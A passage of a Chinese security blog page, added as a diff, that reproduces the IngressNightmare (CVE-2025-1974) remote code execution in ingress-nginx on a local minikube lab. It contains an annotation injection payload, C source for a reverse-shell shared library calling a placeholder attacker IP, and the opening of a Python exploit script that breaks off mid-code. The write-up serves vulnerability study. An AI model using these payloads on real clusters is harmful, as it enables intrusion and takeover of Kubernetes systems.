@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="CVE-2025-1974复现漏洞简介Ingress Nginx Controller 是 K8s 上最受欢迎的 Ingress 控制器之一，有权访问 ingress-nginx 准入控制器 webhook 的攻击者可以创建恶意的 ingress-nginx Ingress 配置，从而导致 RCE 漏洞原因当Ingress Nginx Controller处理传入的 AdmissionReview">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IngressNightmare漏洞集群复现">
+<meta property="og:url" content="http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Xsheep">
+<meta property="og:description" content="CVE-2025-1974复现漏洞简介Ingress Nginx Controller 是 K8s 上最受欢迎的 Ingress 控制器之一，有权访问 ingress-nginx 准入控制器 webhook 的攻击者可以创建恶意的 ingress-nginx Ingress 配置，从而导致 RCE 漏洞原因当Ingress Nginx Controller处理传入的 AdmissionReview">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-03-27T14:21:44.451Z">
+<meta property="article:modified_time" content="2025-03-27T14:21:23.321Z">
+<meta property="article:author" content="Xsheep">
+<meta property="article:tag" content="网络安全博客">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>IngressNightmare漏洞集群复现</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Xsheep" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/link/">link</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2025/01/01/java_sec/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/&text=IngressNightmare漏洞集群复现"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/&title=IngressNightmare漏洞集群复现"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/&is_video=false&description=IngressNightmare漏洞集群复现"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=IngressNightmare漏洞集群复现&body=Check out this article: http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/&title=IngressNightmare漏洞集群复现"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/&title=IngressNightmare漏洞集群复现"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/&title=IngressNightmare漏洞集群复现"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/&title=IngressNightmare漏洞集群复现"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/&name=IngressNightmare漏洞集群复现&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/&t=IngressNightmare漏洞集群复现"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2025-1974%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">CVE-2025-1974复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.</span> <span class="toc-text">进一步利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">1.6.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.7.</span> <span class="toc-text">修复建议</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        IngressNightmare漏洞集群复现
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Xsheep</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-27T14:21:44.451Z" class="dt-published" itemprop="datePublished">2025-03-27</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="CVE-2025-1974复现"><a href="#CVE-2025-1974复现" class="headerlink" title="CVE-2025-1974复现"></a>CVE-2025-1974复现</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Ingress Nginx Controller 是 K8s 上最受欢迎的 Ingress 控制器之一，有权访问 ingress-nginx 准入控制器 webhook 的攻击者可以创建恶意的 ingress-nginx Ingress 配置，从而导致 RCE</p>
+<h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>当Ingress Nginx Controller处理传入的 AdmissionReview请求时，它会根据模板文件和提供的 Ingress 对象生成一个临时 NGINX 配置文件。然后，它使用 <code>nginx -t</code>命令测试临时配置文件的有效性。</p>
+<p>问题关键点有三个，谁可以发送AdmissionReview请求？，如何注入恶意NGINX配置文件？，如何利用nginx -t 命令执行rce？</p>
+<p>对于第一个问题，通常，只有 Kubernetes API 服务器应该发送这些 AdmissionReview 请求。但是，由于 Admission Controller 缺少身份验证，因此具有最小网络访问权限的攻击者可以从集群内的任何 Pod 构建并发送任意 AdmissionReview 请求。</p>
+<p>第二个问题，CVE-2025-1974漏洞是IngressNightmare漏洞集群中的一个，与其同时爆出的CVE-2025-24514，CVE-2025-1097，CVE-2025-1098皆为远程NGINX配置注入，可利用这三个漏洞实现注入任意 NGINX 配置指令。</p>
+<p>第三个问题，Ingress Nginx Controller 中有许多可用的指令，<code>ssl_engine</code> 指令是 OpenSSL 模块的一部分，这个指令可以在配置文件中的任何位置使用，以在 NGINX 配置测试阶段加载任意库文件。此时出现第四个问题，如何上传恶意共享库文件？</p>
+<p>如果 HTTP 请求正文大小大于特定阈值（默认为8KB）时，NGINX 有时会将请求体保存到临时文件中，将请求中的标头设置为大于实际内容大小。NGINX 会一直等待发送更多数据，这会导致进程挂起，让文件描述符打开的时间更长，通过遍历爆破 PID 和 FD 编号，找到文件描述符，对恶意共享库进行加载。</p>
+<h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><p>ingress-nginx&#x2F;internal&#x2F;ingress&#x2F;controller&#x2F;controller.go</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">content, err := n.generateTemplate(cfg, *pcfg)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		n.metricCollector.IncCheckErrorCount(ing.ObjectMeta.Namespace, ing.Name)</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = n.testTemplate(content)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		n.metricCollector.IncCheckErrorCount(ing.ObjectMeta.Namespace, ing.Name)</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>generateTemplate函数生成cfg文件，testTemplate函数进行配置测试</p>
+<p>testTemplate函数如下</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n *NGINXController)</span></span> testTemplate(cfg []<span class="type">byte</span>) <span class="type">error</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(cfg) == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;invalid NGINX configuration (empty)&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	tmpfile, err := os.CreateTemp(filepath.Join(os.TempDir(), <span class="string">&quot;nginx&quot;</span>), tempNginxPattern)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> tmpfile.Close()</span><br><span class="line">	err = os.WriteFile(tmpfile.Name(), cfg, file.ReadWriteByUser)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	out, err := n.command.Test(tmpfile.Name())</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="comment">// this error is different from the rest because it must be clear why nginx is not working</span></span><br><span class="line">		oe := fmt.Sprintf(<span class="string">`</span></span><br><span class="line"><span class="string">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">Error: %v</span></span><br><span class="line"><span class="string">%v</span></span><br><span class="line"><span class="string">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">`</span>, err, <span class="type">string</span>(out))</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> errors.New(oe)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	os.Remove(tmpfile.Name())</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在testTemplate函数调用Test函数，Test函数代码如下</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(nc NginxCommand)</span></span> Test(cfg <span class="type">string</span>) ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="comment">//nolint:gosec // Ignore G204 error</span></span><br><span class="line">	<span class="keyword">return</span> exec.Command(nc.Binary, <span class="string">&quot;-c&quot;</span>, cfg, <span class="string">&quot;-t&quot;</span>).CombinedOutput()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>使用minikube搭建环境</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64</span><br><span class="line"></span><br><span class="line">sudo install minikube-linux-amd64 /usr/local/bin/minikube</span><br></pre></td></tr></table></figure>
+
+<p>启动minickube (在这里可能会出现很多报错，可根据具体原因解决，此处省略)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">minikube start</span><br></pre></td></tr></table></figure>
+
+<p>安装受漏洞影响版本的ingress-nignx</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.11.2/deploy/static/provider/cloud/deploy.yaml</span><br><span class="line"></span><br><span class="line">#下面两条命令用于换源</span><br><span class="line">sed -i &#x27;s#registry.k8s.io/ingress-nginx/controller:v1.11.2@sha256:d5f8217feeac4887cb1ed21f27c2674e58be06bd8f5184cacea2a69abaf78dce#registry.aliyuncs.com/google_containers/nginx-ingress-controller:v1.11.2#g&#x27; deploy.yaml</span><br><span class="line"> </span><br><span class="line">sed -i &#x27;s#registry.k8s.io/ingress-nginx/kube-webhook-certgen:v1.4.3@sha256:a320a50cc91bd15fd2d6fa6de58bd98c1bd64b9a6f926ce23a600d87043455a3#registry.aliyuncs.com/google_containers/kube-webhook-certgen:v1.4.3#g&#x27; deploy.yaml</span><br><span class="line"></span><br><span class="line"># 安装</span><br><span class="line">kubectl apply -f deploy.yaml</span><br></pre></td></tr></table></figure>
+
+<p>一般情况下启动的validating webhook监听在8443端口 ，用putforward命令进行端口转发</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl port-forward -n ingress-nginx ingress-nginx-controller-76c86b6bbd-s86qn 2333:8443</span><br></pre></td></tr></table></figure>
+
+<p>使用网上的Poc进行验证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gir clone https://github.com/sandumjacob/IngressNightmare-POCs</span><br><span class="line">cd ./CVE-2025-1974</span><br><span class="line">curl --insecure -v -H &quot;Content-Type: application/json&quot; --data @poc.json https://localhost:2333/123</span><br></pre></td></tr></table></figure>
+
+<p>查看日志</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl logs ingress-nginx-controller-76c86b6bbd-s86qn -n ingress-nginx</span><br></pre></td></tr></table></figure>
+
+<p>出现以下语句，说明验证了上传的nginx配置，即存在漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I0326 02:53:15.823881       7 main.go:107] &quot;successfully validated configuration, accepting&quot; ingress=&quot;/&quot;</span><br></pre></td></tr></table></figure>
+
+<p>进行深一步利用需搭配IngressNightmare的其余漏洞，攻击分三步实现RCE：上传恶意.so文件至Pod临时存储；通过Content-Length标头维持文件描述符；注入ssl_engine指令加载恶意库。</p>
+<h3 id="进一步利用"><a href="#进一步利用" class="headerlink" title="进一步利用"></a>进一步利用</h3><p>通过 CVE-2025-24514 + CVE-2025-1974 实现RCE</p>
+<p>当我们在auth-url annotation处配置如下时</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx.ingress.kubernetes.io/auth-url: &quot;http://example.com/#;\ninjection_point&quot; </span><br></pre></td></tr></table></figure>
+
+<p>由于注释符的原因，\n会被解析为回车，于是配置文件中会显示为如下格式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">... </span><br><span class="line">proxy_http_version 1.1; </span><br><span class="line">set $target http://example.com/#; </span><br><span class="line">injection_point </span><br><span class="line">proxy_pass $target; </span><br><span class="line">... </span><br></pre></td></tr></table></figure>
+
+<p>如果我们将上面的injection_point替换为<code>ssl_engine</code>指令，即可在测试配置文件时加载恶意库<br>编写恶意库文件，用于反弹shell</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) <span class="type">static</span> <span class="type">void</span> <span class="title function_">reverse_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *server_ip=<span class="string">&quot;xx.xx.xx.xx&quot;</span>;</span><br><span class="line">    <span class="type">uint32_t</span> server_port=<span class="number">6666</span>;</span><br><span class="line">    <span class="type">int</span> sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">attacker_addr</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    attacker_addr.sin_family = AF_INET;</span><br><span class="line">    attacker_addr.sin_port = htons(server_port);</span><br><span class="line">    attacker_addr.sin_addr.s_addr = inet_addr(server_ip);</span><br><span class="line">    <span class="keyword">if</span>(connect(sock, (<span class="keyword">struct</span> sockaddr *)&amp;attacker_addr,<span class="keyword">sizeof</span>(attacker_addr))!=<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    dup2(sock, <span class="number">0</span>);</span><br><span class="line">    dup2(sock, <span class="number">1</span>);</span><br><span class="line">    dup2(sock, <span class="number">2</span>);</span><br><span class="line">    <span class="type">char</span> *args[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, args, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进行编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC shell.c -o shell.so</span><br></pre></td></tr></table></figure>
+
+<p>接下来就是利用nginx的客户端缓冲机制暂存shell文件，并且遍历进程pid和fd触发加载</p>
+<p>exp如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># 此处注意，由于是本地验证 我执行了以下两条命令进行端口转发</span><br><span class="line">#kubectl port-forward -n ingress-nginx svc/ingress-nginx-controller-admission 2333:8443 &amp;</span><br><span class="line">#kubectl port-forward -n ingress-nginx svc/ingress-nginx-controller 2888:80 &amp;</span><br><span class="line"></span><br><span class="line">admission_url = &#x27;https://localhost:2333/123&#x27;</span><br><span class="line">url = &#x27;http://localhost:2888&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;apiVersion&quot;: &quot;admission.k8s.io/v1&quot;,</span><br><span class="line">  &quot;kind&quot;: &quot;AdmissionReview&quot;,</span><br><span class="line">  &quot;request&quot;: &#123;</span><br><span class="line">    &quot;kind&quot;: &#123;</span><br><span class="line">      &quot;group&quot;: &quot;networking.k8s.io&quot;,</span><br><span class="line">      &quot;version&quot;: &quot;v1&quot;,</span><br><span class="line">      &quot;kind&quot;: &quot;Ingress&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;resource&quot;: &#123;</span><br><span class="line">      &quot;group&quot;: &quot;&quot;,</span><br><span class="line">      &quot;version&quot;: &quot;v1&quot;,</span><br><span class="line">      &quot;resource&quot;: &quot;namespaces&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;operation&quot;: &quot;CREATE&quot;,</span><br><span class="line">    &quot;object&quot;: &#123;</span><br><span class="line">      &quot;metadata&quot;: &#123;</span><br><span class="line">        &quot;name&quot;: &quot;deads&quot;,</span><br><span class="line">        &quot;annotations&quot;: &#123;</span><br><span class="line">            &quot;nginx.ingress.kubernetes.io/auth-url&quot;: &quot;injection&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;spec&quot;: &#123;</span><br><span class="line">        &quot;rules&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;host&quot;: &quot;jacobsandum.com&quot;,</span><br><span class="line">            &quot;http&quot;: &#123;</span><br><span class="line">            &quot;paths&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                &quot;path&quot;: &quot;/&quot;,</span><br><span class="line">                &quot;pathType&quot;: &quot;Prefix&quot;,</span><br><span class="line">                &quot;backend&quot;: &#123;</span><br><span class="line">                    &quot;service&quot;: &#123;</span><br><span class="line">                    &quot;name&quot;: &quot;kubernetes&quot;,</span><br><span class="line">                    &quot;port&quot;: &#123;</span><br><span class="line">                        &quot;number&quot;: 80</span><br><span class="line">                    &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ],</span><br><span class="line">        &quot;ingressClassName&quot;: &quot;nginx&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">with open(&quot;poc.json&quot;, &quot;r&quot;) as f:</span><br><span class="line">    data = json.load(f)</span><br><span class="line"></span><br><span class="line">with open(&quot;shell.so&quot;, &quot;rb&quot;) as f:</span><br><span class="line">    shellcode = f.read()</span><br><span class="line"></span><br><span 